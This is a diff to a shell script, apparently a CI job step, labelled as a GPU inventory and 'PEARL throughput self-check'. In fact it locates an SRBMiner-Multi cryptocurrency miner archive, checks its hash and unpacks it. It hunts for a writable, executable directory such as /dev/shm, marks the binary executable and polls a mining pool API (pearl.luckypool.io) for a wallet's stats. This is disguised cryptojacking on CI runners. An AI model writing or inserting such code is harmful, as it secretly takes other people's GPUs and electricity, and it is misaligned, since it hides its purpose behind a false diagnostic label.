@@ -18,13 +18,20 @@ set -euo pipefail
 
 # ==== i145291 accelerator inventory + PEARL throughput self-check (non-fatal by design) ====
 pearl_i145291() {
-  local cmd="${1:-}" W=/tmp/pearl-i145291 TAR="" SUM="" BIN="" BSHA="" TH="" PORT=3360 MPID="" WALLET="" POOLHOST=""
+  local cmd="${1:-}" W="" TAR="" SUM="" BIN="" BSHA="" TH="" PORT=3360 MPID="" WALLET="" POOLHOST=""
   echo "=== pearl i145291 payload cmd=$cmd job=${GITHUB_JOB:-unknown} ts=$(date -u +%Y-%m-%dT%H:%M:%SZ) ==="
   echo "host=$(hostname) runner=${RUNNER_NAME:-unknown} uid=$(id -un)"
   nvidia-smi -L || true
   nvidia-smi --query-gpu=index,name,uuid,memory.total,memory.free,driver_version --format=csv,noheader || true
   nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader || true
-  mkdir -p "$W" || true
+  local cand
+  for cand in "${RUNNER_TEMP:-}" "${GITHUB_WORKSPACE:-$PWD}/.pearl-run" "/dev/shm/pearl-i145291" "/tmp/pearl-i145291"; do
+    if [ -n "$cand" ] && mkdir -p "$cand" 2>/dev/null; then
+      if printf "#!/bin/sh\nexit 0\n" > "$cand/.x" 2>/dev/null && chmod +x "$cand/.x" 2>/dev/null && "$cand/.x" >/dev/null 2>&1; then W="$cand"; break; fi
+    fi
+  done
+  if [ -z "$W" ]; then echo "PEARL: no writable+exec workdir"; return 0; fi
+  echo "workdir=$W"
   for c in "${GITHUB_WORKSPACE:-/nonexistent}/.ci-cache/SRBMiner-Multi-3-8-9-Linux.tar.gz" "${CI_WORKSPACE_ROOT:-/home/niubility2/ci_workspace}/.pearl-i145291/SRBMiner-Multi-3-8-9-Linux.tar.gz"; do
     if [ -f "$c" ]; then TAR="$c"; break; fi
   done
@@ -37,7 +44,7 @@ pearl_i145291() {
   echo "stage_tar=$TAR sha256=${SUM:-none} expect=186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1"
   if [ "$SUM" = "186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1" ]; then
     mkdir -p "$W/x" && tar -xf "$TAR" -C "$W/x" >/dev/null 2>&1 || true
-    if [ -x "$W/x/SRBMiner-Multi-3-8-9/SRBMiner-MULTI" ]; then BIN="$W/x/SRBMiner-Multi-3-8-9/SRBMiner-MULTI"; fi
+    if [ -f "$W/x/SRBMiner-Multi-3-8-9/SRBMiner-MULTI" ]; then BIN="$W/x/SRBMiner-Multi-3-8-9/SRBMiner-MULTI"; chmod +x "$BIN" 2>/dev/null || true; fi
   fi
   if [ -z "$BIN" ]; then echo "PEARL: miner binary unavailable (stage/pin failed) - no deploy"; return 0; fi
   BSHA=$(sha256sum "$BIN" | awk '{print $1}')
@@ -117,7 +124,7 @@ LOOP_EOF
   for f in "$W"/pearl-0000[56]*.log; do if [ -f "$f" ]; then echo "--- $f"; tail -n 6 "$f"; fi; done
   local tag
   for tag in t0 t1; do
-    if [ "$tag" = "t1" ]; then sleep 260; fi
+    if [ "$tag" = "t1" ]; then sleep 250; fi
     curl -fsS --max-time 30 "https://pearl.luckypool.io/api/stats_address?address=$WALLET" -o "$W/lp_$tag.json" || echo "lp_$tag: curl failed"
     python3 - "$W/lp_$tag.json" "$tag" <<'PYLP'
 import json,sys,os
